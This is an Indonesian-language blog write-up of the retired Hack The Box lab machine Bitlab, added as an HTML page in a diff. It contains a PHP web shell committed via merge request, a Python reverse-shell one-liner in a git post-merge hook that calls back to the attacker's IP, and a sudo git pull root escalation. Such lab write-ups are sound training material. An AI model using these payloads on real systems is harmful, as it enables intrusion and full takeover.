@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>[HTB] Bitlab | bl33dz:~#</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="[HTB] Bitlab" />
+<meta name="author" content="bl33dz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hack The Box Bitlab Writeup" />
+<meta property="og:description" content="Hack The Box Bitlab Writeup" />
+<link rel="canonical" href="http://bl33dz.github.io/2020/05/05/hackthebox-bitlab.html" />
+<meta property="og:url" content="http://bl33dz.github.io/2020/05/05/hackthebox-bitlab.html" />
+<meta property="og:site_name" content="bl33dz:~#" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-05-05T00:00:00+07:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"[HTB] Bitlab","dateModified":"2020-05-05T00:00:00+07:00","datePublished":"2020-05-05T00:00:00+07:00","url":"http://bl33dz.github.io/2020/05/05/hackthebox-bitlab.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://bl33dz.github.io/2020/05/05/hackthebox-bitlab.html"},"author":{"@type":"Person","name":"bl33dz"},"description":"Hack The Box Bitlab Writeup","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/old/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/old/assets/favicon.png" />
+  <link type="application/atom+xml" rel="alternate" href="https://bl33dz.github.io/feed.xml" title="bl33dz:~#" />
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/old/">bl33dz:~#<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://www.facebook.com/bl33dz"><i class="fab fa-facebook-square"></i></a><a class="color-purple-hover" href="https://github.com/bl33dz"><i class="fab fa-github-square"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="author-box">
+<img src="https://s.gravatar.com/avatar/2c42898e592207a08fefe63c6231c78a?s=256" class="author-avatar" />
+bl33dz<br> ordinary people<br> interested in linux and programming
+
+</div>
+
+<div class="post">
+  <h1 class="post-title">[HTB] Bitlab</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/old/tag/hackthebox/">hackthebox</a>
+      
+      <a class="tag" href="/old/tag/linux/">linux</a>
+      
+      <a class="tag" href="/old/tag/medium/">medium</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 05 May 2020</div>
+  
+  <div class="post-description">Hack The Box Bitlab Writeup</div>
+  
+  <p>Writeup machine Bitlab ini ditulis setelah writeup machine Craft. Nah karena kebetulan machine ini dah retired jadinya bisa publish post ini. Seperti biasa cerita dikit, menurutku machine ini lebih mirip ke CTF daripada real. Untuk lebih jelasnya simak post ini baik baik.</p>
+
+<p>Oke, machine ini menggunakan os linux dan ip addressnya adalah 10.10.10.114 dan hal yang pertama kita lakukan adalah ritual scanning dengan nmap untuk ngintip port port yang kebuka</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/gitlab# nmap -sV 10.10.10.114
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-26 10:57 WIB
+Nmap scan report for 10.10.10.114
+Host is up (0.41s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 58.78 seconds
+</code></pre></div></div>
+<p>Result diatas menunjukkan bahwa machine ini memiliki 2 buah port yang terbuka yaitu port 80(http) dan 22(ssh). Yaudah karena dapatnya cuma itu pertama saya lihat lihat port 80nya dulu.</p>
+
+<p><img src="/assets/images/bitlab-1.png" alt="bitlab-1.png" /></p>
+
+<p>Bisa dilihat bahwa di port tersebut terdapat webapp gitlab. Nah setelah mencoba menelusuri web tersebut terdapat sebuah page agak mencurigakan <a href="http://10.10.10.114/help/bookmarks.html">http://10.10.10.114/help/bookmarks.html</a></p>
+
+<p><img src="/assets/images/bitlab-2.png" alt="bitlab-2.png" /></p>
+
+<p>Nah ketika mencoba mengklik <code class="highlighter-rouge">Gitlab Login</code> tidak ter-redirect kemanapun dan kalau sudah begini view-source lah kuncinya</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;A HREF="javascript:(function(){ var _0x4b18=[&amp;quot;\x76\x61\x6C\x75\x65&amp;quot;,&amp;quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&amp;quot;,&amp;quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&amp;quot;,&amp;quot;\x63\x6C\x61\x76\x65&amp;quot;,&amp;quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&amp;quot;,&amp;quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&amp;quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()" ADD_DATE="1554932142"&gt;Gitlab Login&lt;/A&gt;
+</code></pre></div></div>
+<p>Disana terdapat javascript function yang digunakan untuk mengubah suatu value tag html. <em>Kok bisa tau?</em> tau aja sih soalnya punya ilmu dukun. Kebetulan karena namanya <code class="highlighter-rouge">Gitlab Login</code> maka saya akan mengeksekusi javascript tersebut pada form login menggunakan console. (btw decode dulu html_entity-nya)</p>
+
+<p><img src="/assets/images/bitlab-3.png" alt="bitlab-3.png" /></p>
+
+<p>Nah kan keisi sendiri username sama passwordnya, kalau mau lihat passwordnya bisa inspect element webnya dan ubah type password ke text. Username: <code class="highlighter-rouge">clave</code> dan Password: <code class="highlighter-rouge">11des0081x</code>. Oke langsung saja login dan seperti biasa enumerate webnya. Saya menemukan 2 repository <a href="http://10.10.10.114/root/profile/">Profile</a> dan <a href="http://10.10.10.114/root/deployer/">Deployer</a>. Ketika saya mau mencoba membuka Settings terbuka <a href="http://10.10.10.114/profile/">http://10.10.10.114/profile/</a></p>
+
+<p>Setelah mendapat beberapa hal hal berguna saya menyimpulkan bahwa <a href="http://10.10.10.114/profile/">http://10.10.10.114/profile/</a> isinya sama persis dengan repository <code class="highlighter-rouge">profile</code> dan pada repository <code class="highlighter-rouge">deployer</code> terdapat script php untuk melakukan git pull pada repository <code class="highlighter-rouge">profile</code></p>
+
+<p>Disini saya langsung mencoba membuat sebuah file di repository file dengan extensi php dan melakukan merge request</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/bitlab-4.png" alt="bitlab-4.png" /></p>
+
+<p>Dan ketika saya coba check ternyata file tersebut berhasil ditambahkan dan singkat cerita akhirnya saya mendapat reverse shell 
+(referensi: <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/gitlab# nc -vlp 1337
+listening on [any] 1337 ...
+10.10.10.114: inverse host lookup failed: Unknown host
+connect to [10.10.14.115] from (UNKNOWN) [10.10.10.114] 48218
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre></div></div>
+
+<p>Setelah mendapat reverse shell saya teringat sebuah script pada repository <code class="highlighter-rouge">deployer</code> tadi</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="nv">$input</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"php://input"</span><span class="p">);</span>
+<span class="nv">$payload</span>  <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
+
+<span class="nv">$repo</span> <span class="o">=</span> <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">project</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$event</span> <span class="o">=</span> <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">event_type</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$state</span> <span class="o">=</span> <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">object_attributes</span><span class="o">-&gt;</span><span class="na">state</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$branch</span> <span class="o">=</span> <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">object_attributes</span><span class="o">-&gt;</span><span class="na">target_branch</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$repo</span><span class="o">==</span><span class="s1">'Profile'</span> <span class="o">&amp;&amp;</span> <span class="nv">$branch</span><span class="o">==</span><span class="s1">'master'</span> <span class="o">&amp;&amp;</span> <span class="nv">$event</span><span class="o">==</span><span class="s1">'merge_request'</span> <span class="o">&amp;&amp;</span> <span class="nv">$state</span><span class="o">==</span><span class="s1">'merged'</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s1">'cd ../profile/; sudo git pull'</span><span class="p">),</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">echo</span> <span class="s2">"OK</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+</code></pre></div></div>
+<p>Nah dari script tersebut terlihat bahwa <code class="highlighter-rouge">www-data</code> dapat menjalankan command <code class="highlighter-rouge">sudo git pull</code> dan saya mencoba memastikan dengan command <code class="highlighter-rouge">sudo -l</code></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
+Matching Defaults entries for www-data on bitlab:
+    env_reset, exempt_group=sudo, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bitlab:
+    (root) NOPASSWD: /usr/bin/git pull
+</code></pre></div></div>
+
+<p>Setelah baca sana sini saya akan <del>tidur</del> langsung melakukan privilege escalation dengan git hook <code class="highlighter-rouge">post-merge</code> 
+(referensi: <a href="https://stackoverflow.com/a/21338177">https://stackoverflow.com/a/21338177</a>)</p>
+
+<p>Oke mulai privilege escalationnya, pertama saya copy folder <code class="highlighter-rouge">/var/www/html/profile</code> ke folder <code class="highlighter-rouge">/tmp</code> dan membuat <code class="highlighter-rouge">post-merge</code> pada .git/hooks</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bitlab:/tmp$ cp -r /var/www/html/profile .
+www-data@bitlab:/tmp$ cd profile
+www-data@bitlab:/tmp/profile$ cd .git 
+www-data@bitlab:/tmp/profile/.git$ ls
+FETCH_HEAD  ORIG_HEAD  config	    hooks  info  objects      refs
+HEAD	    branches   description  index  logs  packed-refs
+www-data@bitlab:/tmp/profile/.git$ cd hooks
+www-data@bitlab:/tmp/profile/.git/hooks$ cat &gt; post-merge &lt;&lt; 'EOF'
+&gt; #!/bin/bash
+&gt; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.115",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+&gt; EOF
+www-data@bitlab:/tmp/profile/.git/hooks$ cat post-merge
+#!/bin/bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.115",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+www-data@bitlab:/tmp/profile/.git/hooks$ chmod +x post-merge
+</code></pre></div></div>
+<p><em>Bisa dibaca kan?</em> oke, karena ketika saya git pull ternyata sudah up to date maka saya mencoba melakukan merge pada repository <code class="highlighter-rouge">profile</code> seperti awal tadi dan melakukan <code class="highlighter-rouge">sudo git pull</code> di directory <code class="highlighter-rouge">/tmp/profile</code></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bitlab:/tmp/profile$ cp -r /var/www/html/profile/* . # nah pas ini baru diklik merge
+www-data@bitlab:/tmp/profile$ sudo git pull
+remote: Enumerating objects: 1, done.
+remote: Counting objects: 100% (1/1), done.
+remote: Total 1 (delta 0), reused 0 (delta 0)
+Unpacking objects: 100% (1/1), done.
+From ssh://localhost:3022/root/profile
+   c2e2077..5b34904  master     -&gt; origin/master
+Updating c2e2077..5b34904
+Fast-forward
+ hello.php | 3 +++
+ 1 file changed, 3 insertions(+)
+ create mode 100644 hello.php
+</code></pre></div></div>
+<p>Disini listener saya mendapat respon yang berarti command berhasil dieksekusi</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/gitlab# nc -vlp 1234
+listening on [any] 1234 ...
+10.10.10.114: inverse host lookup failed: Unknown host
+connect to [10.10.14.115] from (UNKNOWN) [10.10.10.114] 49358
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+8d4cc131757957cb68d9a0cddccd587c
+# ls /home
+clave
+# cat /home/clave/user.txt
+1e3fd81ec3aa2f1462370ee3c20b8154
+</code></pre></div></div>
+<p>Nahkan langsung dapet dua flag <em>wkwkwk</em>. Ngomong ngomong writeup ini agak ribet dan untuk yang kurang jelas bisa kontak telegram saya <a href="https://t.me/bl33dz">@bl33dz</a></p>
+
+<p>Dan kalo bisa <em>Respect</em> akun hackthebox saya yang ada dibawah ini.</p>
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/old/2020/05/20/vulnhub-typo1.html">
+            [VULNHUB] Typo: 1
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/old/2020/05/04/web-joints.html">
+            [JOINTS2020] Writeup Category Web
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/old/2019/12/07/hackthebox-wall.html">
+            [HTB] Wall
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/old/tag/ctf/" class="set-1">ctf</a> <a href="/old/tag/easy/" class="set-1">easy</a> <a href="/old/tag/hackthebox/" class="set-2">hackthebox</a> <a href="/old/tag/linux/" class="set-5">linux</a> <a href="/old/tag/medium/" class="set-4">medium</a> <a href="/old/tag/rce/" class="set-1">rce</a> <a href="/old/tag/vulnhub/" class="set-2">vulnhub</a> <a href="/old/tag/web/" class="set-1">web</a> <a href="/old/tag/xss/" class="set-1">xss</a></div>
+  
+
+
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+  	<center><a href="https://www.hackthebox.eu/home/users/profile/67190"><img src="https://www.hackthebox.eu/badge/image/67190" alt="Hack The Box"></a></center><br><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+if (theme === 'undefined') {
+   theme = "dark";
+}
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+} else {
+    document.documentElement.setAttribute('data-theme', 'light');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
